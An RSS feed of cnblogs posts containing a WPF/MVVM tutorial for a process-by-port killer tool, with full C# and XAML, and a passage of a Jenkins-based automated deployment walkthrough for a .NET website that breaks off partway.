<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>查杀进程小工具——WPF和MVVM初体验 - zer0black</title>
<link>http://www.cnblogs.com/zer0Black/p/13766857.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zer0Black/p/13766857.html</guid>
<description>&lt;p&gt;最近因为工作需要，研究了一下桌面应用程序。在winform、WPF、Electron等几种技术里，最终选择了WPF作为最后的选型。WPF最吸引我的地方，就是MVVM模式了。MVVM模式完全把界面和业务剥离开来，页面所有操作都通过数据来驱动。更替页面不用修改业务代码逻辑。&lt;/p&gt;
&lt;p&gt;以一个查杀进程的小工具来作为初次学习的成果总结。日常开发Java Web程序的时候，进程遇到端口占用问题，通过命令查找端口、查找进程、杀死进程，这一套命令敲下来过于麻烦。于是就写了这么一个小Demo，即作为学习使用，也为以后工作降低工作量。&lt;/p&gt;
&lt;h2 id=&quot;需求设计&quot;&gt;需求设计&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;进程列表：展示所有经常的列表，按照应用名称正序排序。列表展示进程名、PID、协议、本机IP:端口、远程IP:端口、进程路径&lt;/li&gt;
&lt;li&gt;搜索框：进行端口搜索，在经常列表中展示搜索结果&lt;/li&gt;
&lt;li&gt;刷新按钮：刷新进程列表&lt;/li&gt;
&lt;li&gt;杀死按钮：选中进程，进行进程的杀死。杀死进程后刷新进程列表&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;关键要点&quot;&gt;关键要点&lt;/h2&gt;
&lt;ol readability=&quot;4&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;DataContext&lt;br/&gt;DataContext主要作用是用于绑定数据源，默认值为null。&lt;br/&gt;DataContext是FrameworkElement中的一个属性。而绝大部分的UI组件都继承路径中都有FrameworkElement类，所以我们可以认为，大部分UI组件都有DataContext属性。并且设置了某个对象的DataContext，那么会对这个对象的所有子对象都会产生同样的影响。&lt;br/&gt;所以一般来说，我们都会在顶级对象（Window对象）中去设置DataContext属性。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;使用MVVM的意义&lt;br/&gt;使用统一开发模式最大的优点，是统一团队的思维方式和实现方式，从思维上保持代码的整洁。每个理解了模式的人都知道代码该怎么写。此外，MVVM模式在架构上解耦的比较彻底，数据驱动界面的模式也可让结构更清晰。由于业务和界面剥离，业务代码的可测性、可读性、可替换性得到提升。所以，既然WPF支持MVVM模式，就不要把WPF写成WinForm。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;View 和 ViewModel&lt;br/&gt;View是UI、ViewModel是界面的数据模型。ViewModel和View是怎么沟通的呢？ViewModel只会给View传递两种数据：属性数据和操作数据。传递数据用一般的数据模型来处理，传递操作用命令属性来处理。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;项目结构&quot;&gt;项目结构&lt;/h2&gt;
&lt;h4 id=&quot;引用包说明&quot;&gt;引用包说明&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;MaterialDesignThemes：主要用于界面的美化，通过NuGet包管理搜索MaterialDesignThemes直接安装&lt;/li&gt;
&lt;li&gt;Prism.Wpf：是实现MVVM的框架，通过NuGet包管理搜索Prism.Wpf直接安装&lt;/li&gt;
&lt;/ol&gt;&lt;h4 id=&quot;项目目录结构说明&quot;&gt;项目目录结构说明&lt;/h4&gt;
&lt;p&gt;WinPidKiller 项目名&lt;br/&gt;     - Models 业务数据模型层&lt;br/&gt;         NetworkInfo.cs 网络端口数据模型&lt;br/&gt;         ProcessInfo.cs 进程数据模型&lt;br/&gt;    - Services 业务逻辑层&lt;br/&gt;         IProcessInfoService.cs 进程业务操作接口&lt;br/&gt;         - impl 业务逻辑实现&lt;br/&gt;             ProcessInfoService.cs 进程业务操作实现类&lt;br/&gt;     - ViewModels 视图数据模型层，沟通View和Model的重要组件&lt;br/&gt;         ProcessItemViewModel.cs 单行进程视图数据模型（列表中每行数据的模型）&lt;br/&gt;         MainWindowViewModel.cs 主视图数据模型&lt;br/&gt;     - Views 界面层&lt;br/&gt;     MainWindow.xmal 主窗口文件&lt;/p&gt;
&lt;h4 id=&quot;代码解释说明&quot;&gt;代码解释说明&lt;/h4&gt;
&lt;h6 id=&quot;models&quot;&gt;Models&lt;/h6&gt;
&lt;p&gt;数据模型仅针对于业务数据&lt;br/&gt;NetworkInfo.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller.Models
{
    class NetworkInfo
    {
        public string Pid { get; set; }
        public string AgreeMent { get; set; }
        public string LocalIp { get; set; }
        public string RemoteIp { get; set; }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ProcessInfo.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller.Models
{
    class ProcessInfo
    {
        public string Name { get; set; }
        public string Pid { get; set; }
        public string AgreeMent { get; set; }
        public string LocalIp { get; set; }
        public string RemoteIp { get; set; }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;services&quot;&gt;Services&lt;/h6&gt;
&lt;p&gt;仅包含ProcessInfoService类，主要实现端口的查询（通过调用cmd进程），进程的获取和杀死等操作&lt;br/&gt;ProcessInfoService.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller.Services.Impl
{
    class ProcessInfoService : IProcessInfoService
    {
        /**
         * 若port为空则获取所有进程信息
         * 若port不为空则获取占用port的线程
         */
        public List&amp;lt;ProcessInfo&amp;gt; GetAllProcessInfo(String port)
        {
            List&amp;lt;ProcessInfo&amp;gt; processInfoList = new List&amp;lt;ProcessInfo&amp;gt;();

            // 拿到所有进程
            Dictionary&amp;lt;int, Process&amp;gt; processMap = GetAllProcess();

            List&amp;lt;NetworkInfo&amp;gt; networkInfos = null;
            if (!(string.IsNullOrEmpty(port)))
            {
                // 根据port查询出对应的端口信息，展示对应进程信息
                networkInfos = GetPortInfo(port);
            } else
            {
                networkInfos = GetPortInfo(); 
            }

            foreach (NetworkInfo networkInfo in networkInfos)
            {
                ProcessInfo processInfo = new ProcessInfo();

                int.TryParse(networkInfo.Pid, out int pid);
                Process process = processMap[pid];

                processInfo.Name = process.ProcessName;
                processInfo.Pid = process.Id.ToString();
                processInfo.AgreeMent = networkInfo.AgreeMent;
                processInfo.LocalIp = networkInfo.LocalIp;
                processInfo.RemoteIp = networkInfo.RemoteIp;

                processInfoList.Add(processInfo);
            }

            return processInfoList;
        }

        /**
         * 获取所有进程信息
         */
        public List&amp;lt;ProcessInfo&amp;gt; GetAllProcessInfo()
        {
            return GetAllProcessInfo(null);
        }

        /**
         * 根据pid列表杀死所有进程
         */
        public void KillProcess(List&amp;lt;string&amp;gt; pidList)
        {
            if (pidList == null || pidList.Count == 0)
            {
                MessageBox.Show(&quot;请选择正确的进程号&quot;);
                return;
            }

            Dictionary&amp;lt;int, Process&amp;gt; processMap = GetAllProcess();

            StringBuilder sb = new StringBuilder();
            foreach (var pidStr in pidList)
            {
                int.TryParse(pidStr, out int pid);
                Process process = processMap[pid];
                try
                {
                    process.Kill();
                    sb.Append(&quot;已杀掉&quot;);
                    sb.Append(process.ProcessName);
                    sb.Append(&quot;进程！！！&quot;);
                }
                catch (Win32Exception e)
                {
                    sb.Append(process.ProcessName);
                    sb.Append(e.Message.ToString());
                }
                catch (InvalidOperationException e)
                {
                    sb.Append(process.ProcessName);
                    sb.Append(e.Message.ToString());
                }
            }

            MessageBox.Show(sb.ToString());
        }

        /**
         * 获取所有原始进程信息，并封装为Dictionary
         */
        private Dictionary&amp;lt;int, Process&amp;gt; GetAllProcess()
        {
            Process[] processes = Process.GetProcesses();
            return processes.ToDictionary(key =&amp;gt; key.Id, process =&amp;gt; process);
        }

        /**
         * 获取所有端口信息
         */
        private List&amp;lt;NetworkInfo&amp;gt; GetPortInfo()
        {
            return GetPortInfo(null);
        }

        /**
         * 通过端口取出所有相关的数据
         */
        private List&amp;lt;NetworkInfo&amp;gt; GetPortInfo(string port)
        {
            List&amp;lt;NetworkInfo&amp;gt; networkInfoList = new List&amp;lt;NetworkInfo&amp;gt;();
            Process process = CreateCmd();
            process.Start();

            if (string.IsNullOrEmpty(port))
            {
                process.StandardInput.WriteLine(string.Format(&quot;netstat -ano&quot;));
            } else
            {
                process.StandardInput.WriteLine(string.Format(&quot;netstat -ano|find \&quot;{0}\&quot;&quot;, port));
            }
           
            process.StandardInput.WriteLine(&quot;exit&quot;);
            StreamReader reader = process.StandardOutput;
            string strLine = reader.ReadLine();
            while (!reader.EndOfStream)
            {
                strLine = strLine.Trim();
                if (strLine.Length &amp;gt; 0 &amp;amp;&amp;amp; ((strLine.Contains(&quot;TCP&quot;) || strLine.Contains(&quot;UDP&quot;))))
                {
                    Regex r = new Regex(@&quot;\s+&quot;);
                    string[] strArr = r.Split(strLine);
                    // 解析数据格式为 TCP   0.0.0.0:135    0.0.0.0:0   LISTENING   692
                    int defaultResultLength = 5;
                    if (strArr.Length == defaultResultLength)
                    {
                        NetworkInfo networkInfo = new NetworkInfo();
                        // 只拿第一行数据，拿完就撤（每个PID展示一个port就行）
                        networkInfo.AgreeMent = strArr[0];
                        networkInfo.LocalIp = strArr[1];
                        networkInfo.RemoteIp = strArr[2];
                        networkInfo.Pid = strArr[4];

                        networkInfoList.Add(networkInfo);
                    }
                }
                strLine = reader.ReadLine();
            }
            reader.Close();
            process.Close();
            return networkInfoList;
        }

        /**
         * 创建cmd控件
         */
        private Process CreateCmd()
        {
            Process process = new Process();
            process.StartInfo.FileName = &quot;cmd.exe&quot;;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            return process;
        }

    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;viewmodels&quot;&gt;ViewModels&lt;/h6&gt;
&lt;p&gt;主要实现进程列表中单个进程的数据模型ProcessItemViewModel的实现，ProcessItemViewModel比业务数据模型多了选中属性selectItem。另外包含主窗体模型，完成剩下的数据和命令传递。&lt;br/&gt;ProcessItemViewModel.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller.ViewModels
{
    class ProcessItemViewModel : BindableBase
    {
        public ProcessInfo ProcessInfo { get; set; }

        private Boolean selectItem;
        public Boolean SelectItem
        {
            get { return selectItem; }
            set
            {
                selectItem = value;
                SetProperty(ref selectItem, value);
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;MainWindowViewModel.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller.ViewModels
{
    /**
     * 做双向绑定，port提供查询框用，processInfo列表提供dataGrid用
     */
    class MainWindowViewModel : BindableBase
    {
        private int port;
        public int Port
        {
            get { return port; }
            set { 
                port = value;
                SetProperty(ref port, value);
            }
        }

        /**
         * 如果这个DataList列表的内容需要同步刷新，
         * 则类型必须是ObservableCollection。
         * 否则就算控件与数据绑定成功，控件只在初始化时能够正确显示数据，
         * 之后数据发生改变时，控件不会自动刷新。
         */
        private ObservableCollection&amp;lt;ProcessItemViewModel&amp;gt; processItemList;
        public ObservableCollection&amp;lt;ProcessItemViewModel&amp;gt; ProcessItemList
        {
            get { return processItemList; }
            set {
                processItemList = value;
                SetProperty(ref processItemList, value);
            }
        }

        public MainWindowViewModel()
        {
            // 加载数据
            LoadProcessInfo();

            QueryPortCommand = new DelegateCommand(new Action(QueryPortCommandExec));
            KillCommand = new DelegateCommand(new Action(KillCommandExec));
            RefreshCommand = new DelegateCommand(new Action(RefreshCommandExec));
        }

        private void LoadProcessInfo()
        {
            IProcessInfoService processInfoService = new ProcessInfoService();
            processItemList = new ObservableCollection&amp;lt;ProcessItemViewModel&amp;gt;();
            processItemList.AddRange(GetProcessItemViewModel(processInfoService.GetAllProcessInfo())); 
        }

        // 绑定检索命令 和 kill命令
        public DelegateCommand QueryPortCommand { get; set; }
        public DelegateCommand KillCommand { get; set; }
        public DelegateCommand RefreshCommand { get; set; }

        private void QueryPortCommandExec()
        {
            IProcessInfoService processInfoService = new ProcessInfoService();
            processItemList.Clear();
            processItemList.AddRange(GetProcessItemViewModel(processInfoService.GetAllProcessInfo(port.ToString())));
        }

        private void RefreshCommandExec()
        {
            IProcessInfoService processInfoService = new ProcessInfoService();
            processItemList.Clear();
            processItemList.AddRange(GetProcessItemViewModel(processInfoService.GetAllProcessInfo()));
        }

        private void KillCommandExec()
        {
            List&amp;lt;String&amp;gt; pidList = new List&amp;lt;string&amp;gt;();
            foreach (var processItem in processItemList)
            {
                if (processItem.SelectItem) 
                {
                    pidList.Add(processItem.ProcessInfo.Pid);
                }
            }

            IProcessInfoService processInfoService = new ProcessInfoService();
            processInfoService.KillProcess(pidList);

            // 杀死进程后，重新加载列表
            this.QueryPortCommandExec();
        }

        /**
     * 将ProcessInfo列表转为ProcessItemViewModel列表
     */
        private List&amp;lt;ProcessItemViewModel&amp;gt; GetProcessItemViewModel(List&amp;lt;ProcessInfo&amp;gt; processInfos)
        {
            List&amp;lt;ProcessItemViewModel&amp;gt; itemList = new List&amp;lt;ProcessItemViewModel&amp;gt;();
            foreach(ProcessInfo processInfo in processInfos){
                ProcessItemViewModel item = new ProcessItemViewModel() { ProcessInfo = processInfo };
                itemList.Add(item);
            }
            return itemList;
        }

    }
    
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;主窗体界面&quot;&gt;主窗体界面&lt;/h6&gt;
&lt;p&gt;MainWindow.xaml.cs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;namespace WinPidKiller
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.DataContext = new MainWindowViewModel();
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;MainWindow.xaml&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;Window x:Class=&quot;WinPidKiller.MainWindow&quot;
        xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
        xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
        xmlns:d=&quot;http://schemas.microsoft.com/expression/blend/2008&quot;
        xmlns:mc=&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;
        xmlns:local=&quot;clr-namespace:WinPidKiller&quot;
        mc:Ignorable=&quot;d&quot;
        Title=&quot;Pid Killer&quot; Height=&quot;450&quot; Width=&quot;800&quot;
        xmlns:materialDesign=&quot;http://materialdesigninxaml.net/winfx/xaml/themes&quot;
        TextElement.Foreground=&quot;{DynamicResource MaterialDesignBody}&quot;
        TextElement.FontWeight=&quot;Regular&quot;
        TextElement.FontSize=&quot;13&quot;
        TextOptions.TextFormattingMode=&quot;Ideal&quot; 
        TextOptions.TextRenderingMode=&quot;Auto&quot;        
        Background=&quot;{DynamicResource MaterialDesignPaper}&quot;
        &amp;gt;
    &amp;lt;Grid&amp;gt;
        &amp;lt;Grid.RowDefinitions&amp;gt;
            &amp;lt;RowDefinition Height=&quot;80&quot;&amp;gt;&amp;lt;/RowDefinition&amp;gt;
            &amp;lt;RowDefinition&amp;gt;&amp;lt;/RowDefinition&amp;gt;
        &amp;lt;/Grid.RowDefinitions&amp;gt;

        &amp;lt;materialDesign:Card Grid.Row=&quot;0&quot; Padding=&quot;8&quot; Margin=&quot;8,5,8,0&quot;&amp;gt;
            &amp;lt;Grid&amp;gt;
                &amp;lt;Grid.ColumnDefinitions&amp;gt;
                    &amp;lt;ColumnDefinition&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                    &amp;lt;ColumnDefinition Width=&quot;110&quot;&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                    &amp;lt;ColumnDefinition Width=&quot;110&quot;&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                &amp;lt;/Grid.ColumnDefinitions&amp;gt;

                &amp;lt;TextBox Grid.Column=&quot;0&quot; Text=&quot;{Binding Path=Port}&quot; HorizontalAlignment=&quot;Stretch&quot; Margin=&quot;0,0,110,0&quot; FontSize=&quot;20&quot; VerticalAlignment=&quot;Center&quot;/&amp;gt;
                &amp;lt;Button Content=&quot;检索&quot; Grid.Column=&quot;0&quot; Width=&quot;100&quot; HorizontalAlignment=&quot;Right&quot; Command=&quot;{Binding QueryPortCommand}&quot;/&amp;gt;
                &amp;lt;Button Content=&quot;刷新&quot; Grid.Column=&quot;1&quot; Width=&quot;100&quot; HorizontalAlignment=&quot;Right&quot; Command=&quot;{Binding RefreshCommand}&quot;/&amp;gt;
                &amp;lt;Button Content=&quot;杀死&quot; Grid.Column=&quot;2&quot; Width=&quot;100&quot; HorizontalAlignment=&quot;Right&quot; Command=&quot;{Binding KillCommand}&quot;/&amp;gt;
            &amp;lt;/Grid&amp;gt;
        &amp;lt;/materialDesign:Card&amp;gt;

        &amp;lt;materialDesign:Card Grid.Row=&quot;1&quot; Padding=&quot;8&quot; Margin=&quot;8,5,8,5&quot; &amp;gt;
            &amp;lt;DataGrid 
                x:Name=&quot;dataGrid&quot;
                FontSize=&quot;15&quot;
                AlternationCount=&quot;2&quot;
                GridLinesVisibility=&quot;Vertical&quot;
                AutoGenerateColumns=&quot;False&quot;
                IsReadOnly=&quot;True&quot;
                ItemsSource=&quot;{Binding Path=ProcessItemList}&quot;
                      &amp;gt;
                &amp;lt;DataGrid.Columns&amp;gt;
                    &amp;lt;DataGridCheckBoxColumn Width=&quot;50&quot; Header=&quot;&quot; Binding=&quot;{Binding Path=SelectItem,UpdateSourceTrigger=PropertyChanged}&quot; IsReadOnly=&quot;False&quot; CanUserSort=&quot;False&quot; /&amp;gt;
                    &amp;lt;DataGridTextColumn Width=&quot;Auto&quot; Header=&quot;进程名&quot; Binding=&quot;{Binding Path=ProcessInfo.Name}&quot;/&amp;gt;
                    &amp;lt;DataGridTextColumn Width=&quot;100&quot; Header=&quot;PID&quot;  Binding=&quot;{Binding Path=ProcessInfo.Pid}&quot;/&amp;gt;
                    &amp;lt;DataGridTextColumn Width=&quot;80&quot; Header=&quot;协议&quot;  Binding=&quot;{Binding Path=ProcessInfo.AgreeMent}&quot;/&amp;gt;
                    &amp;lt;DataGridTextColumn Width=&quot;200&quot; Header=&quot;本机IP:端口&quot;  Binding=&quot;{Binding Path=ProcessInfo.LocalIp}&quot;/&amp;gt;
                    &amp;lt;DataGridTextColumn Width=&quot;200&quot; Header=&quot;远程IP:端口&quot;  Binding=&quot;{Binding Path=ProcessInfo.RemoteIp}&quot;/&amp;gt;
                &amp;lt;/DataGrid.Columns&amp;gt;
            &amp;lt;/DataGrid&amp;gt;
        &amp;lt;/materialDesign:Card&amp;gt;
    
    &amp;lt;/Grid&amp;gt;
&amp;lt;/Window&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 09 Oct 2020 00:48:00 +0000</pubDate>
<dc:creator>zer0black</dc:creator>
<og:description>最近因为工作需要，研究了一下桌面应用程序。在winform、WPF、Electron等几种技术里，最终选择了WPF作为最后的选型。WPF最吸引我的地方，就是MVVM模式了。MVVM模式完全把界面和业务</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zer0Black/p/13766857.html</dc:identifier>
</item>
<item>
<title>.net网站自动化部署-致两年前的遗留的问题 - 2J</title>
<link>http://www.cnblogs.com/jijunjian/p/13781048.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jijunjian/p/13781048.html</guid>
<description>&lt;p&gt;又到一年国庆，终于有了难得的几天空闲，计划陪陪媳妇娃子，再把最近阅读的几本相关书总结梳理下。当然，计划总是美好的，于时接到了一个老朋友电话。大意是他搞了一个.net小网站，部署了4个节点，每次更新程序都是手动复制到4个机器，时不时忘记部署，忘记备份之类的问题，不胜其烦，希望我帮忙想个办法。回想2年前，在做无人货架项目时，也有部分是.net项目，当时自己也没能处理这个问题，当时用了webdeploy，效果并不理想，虽然后来几乎没碰过.net了，这个问题依然萦绕心头。既然有时间，有报酬，何不接此机会弥补两前年的遗憾呢，于时满口应承了下来。想想现在都在谈CI/CD, DevOps.. 过程应该会是相当愉悦的，又是小网站，要求也不是那么高&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;155.07213050314&quot;&gt;

&lt;p&gt;　　又到一年国庆，终于有了难得的几天空闲，计划陪陪媳妇娃子，再把最近阅读的几本相关书总结梳理下。当然，计划总是美好的，于时接到了一个老朋友电话。大意是他搞了一个.net小网站，部署了4个节点，每次更新程序都是手动复制到4个机器，时不时忘记部署，忘记备份之类的问题，不胜其烦，希望我帮忙想个办法。回想2年前，在做无人货架项目时，也有部分是.net项目，当时自己也没能处理这个问题，当时用了webdeploy，效果并不理想，虽然后来几乎没碰过.net了，这个问题依然萦绕心头。既然有时间，有报酬，何不接此机会弥补两前年的遗憾呢，于时满口应承了下来。想想现在都在谈CI/CD, DevOps.. 过程应该会是相当愉悦的，又是小网站，要求也不是那么高。网站结构如下，非常简单。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008142104263-1681539043.png&quot; alt=&quot;&quot; width=&quot;610&quot; height=&quot;366&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p class=&quot;my_title&quot;&gt;01&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;&lt;strong&gt;还是jenkins&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;        百度一番，一搜一大把，几乎都是利用jenkins，加上之前有过用jenkins做tomcat自动化部署的经验，心中一阵窃喜，过程真的如预期一般顺畅。于时动手，开始了我们愉悦之旅。jenkins是基于Java开发的一种持续集成工具，于时先安装java环境，配置环境变量（我是直接下载 window版本的 jdk 8）。接着下载window对应的jenkins版本，&lt;a href=&quot;https://www.jenkins.io/zh/download/&quot; target=&quot;_blank&quot;&gt;下载地址点这里&lt;/a&gt;，按提示操作，安装推荐插件（安装后也可以插件管理中自行安装），没有注意事项！一波流带走，就来到了欢迎界面。没有任何障碍，感觉半天就可以打卡收工。因为要编译.net程序，需要安装msbuild插件：以次  “&lt;span&gt;&lt;span&gt;Manage Jenkins&lt;/span&gt;&lt;/span&gt;” -&amp;gt; &quot;&lt;span&gt;Manage Plugins&lt;/span&gt;&quot; -&amp;gt; &quot;可选插件&quot;， 搜索 MsBuild，点击直接安装。操作如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008205051603-1917948783.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008162322479-2088245210.png&quot; alt=&quot;&quot; width=&quot;638&quot; height=&quot;479&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　接着  “Manage Jenkins” -&amp;gt; &quot;System Configuration&quot; -&amp;gt; &quot;Global Tool Configuration&quot; 中配置 MSBuild，因为MSBuild插件中自带的编译工具可能比较老，建议在本机安装 visual studio 相同版本，直接使用其自带的编译工具。配置如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008192002973-1758070662.png&quot; alt=&quot;&quot; width=&quot;795&quot; height=&quot;218&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;　　接着，安装git服务，并在 “Manage Jenkins” -&amp;gt; &quot;System Configuration&quot; -&amp;gt; &quot;Global Tool Configuration&quot; 中配置 git 相关参数，配置如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008192155010-1795325429.png&quot; alt=&quot;&quot; width=&quot;865&quot; height=&quot;221&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt; 　　再接着，安装插件 Publish Over SSH。然后在应用程序机器上安装FreeSSHD，用于文件上传和远程执行命名。FreeSSHD 配置过程如下：&lt;/p&gt;
&lt;p&gt;　　 1，添加用户jenkins, &lt;/p&gt;
&lt;p&gt;　　 2，配置telnet, ssh 端口为 23，28；&lt;/p&gt;
&lt;p&gt;　　 3，配置 authentication 目录， 在jenkins服务器，生成ssh key，把公钥文件复制到这个目录，重命名为jenkins，与用户名相同。(使用命令 ssh-keygen -t rsa  生成公钥，私钥 )&lt;/p&gt;
&lt;p&gt;　　 4，配置sftp 目录，为文件上传目录。&lt;/p&gt;
&lt;p&gt; 　　5，&lt;span&gt;&lt;strong&gt;以管理员身份运行 FreeSSHd。这个很重要，不然一直提示 auth fail.&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　 操作步骤如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008202609568-2092123759.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;





&lt;p&gt;　　接着，在 “Manage Jenkins” -&amp;gt; &quot;System Configuration&quot; -&amp;gt; &quot;Global Tool Configuration&quot; 中配置Publish Over SSH 相关参数，配置如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008204657198-2132224442.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;p&gt; 　　在jenkins和应用服务上安装 7Z工具，用于压缩和解压。并在环境变量 path 中配置 7Z的安装目录（用于在任意目录执行命令）。到这里系统工具及配置就完成了，接下来开始任务配置。&lt;/p&gt;


&lt;p class=&quot;my_title&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;02&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;愉悦的构建&lt;/p&gt;

&lt;p&gt;       环境搭建完成，就开始我们的表演吧。新建任务，名称你随意就好，选择“Freestyle project”类型，点击确定。进入任务配置界面。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;General 配置&lt;/strong&gt;中，可以选中 Discard old builds 可以配置以天数和build记录数保留数据。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;源码管理&lt;/strong&gt;中，添加好指定的git地址，及账号密码。以上流程没有任何障碍。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;构建中，&lt;/strong&gt;添加步骤Execute Windows batch command，用户nuget restore。因为前面已经在jenkins机器上安装了visual stadio ，可以直接使用其自带的nuget 工具。 配置如下图，其中 nuget.bat的内容如下：&lt;/p&gt;
&lt;p&gt;　　 NuGet.Build.Tasks.Console.exe restore VideosGYFileS.sln。其中 NuGet.Build.Tasks.Console.exe 为VS自带的，在path中配置了目录这里可以直接运行。（这个命令是在解决方案根目录执行的。），命令最后为exit 0 表示结束。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008205443336-459115295.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;p&gt;　   接着添加步骤　Build a Visual Studio project or solution using MSBuild，选择第一步中添加的 MSBuild 配置，如下图，其中编译参数为：&lt;/p&gt;
&lt;p&gt;　　/t:Rebuild    /property:Configuration=Release;DeployOnBuild=true;TargetFrameworkVersion=v4.6。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008210130379-2024940022.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;





&lt;p&gt; 　　接着添加步骤Execute Windows batch command，用于打包编译后的文件，方便后面上传。压缩时需要排除一些配置文件，配置如下图，compress.bat文件内容如下：&lt;/p&gt;
&lt;p&gt;　　  7z a  deploy.zip .\PrecompiledWeb\Web\* -xr!upload -xr!logs -x!web.config。 （.\  表示打包时去除前缀， -xr! 表示排除目录，-x! 表示排除文件）&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008210747007-137101736.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;





&lt;p&gt;　　到这里，构建选项就已经配置完成了，开始构建，在解决方案目录生成了deploy.zip文件。那说明已经成功了70%了。&lt;/p&gt;

&lt;p class=&quot;my_title&quot;&gt;03&lt;/p&gt;
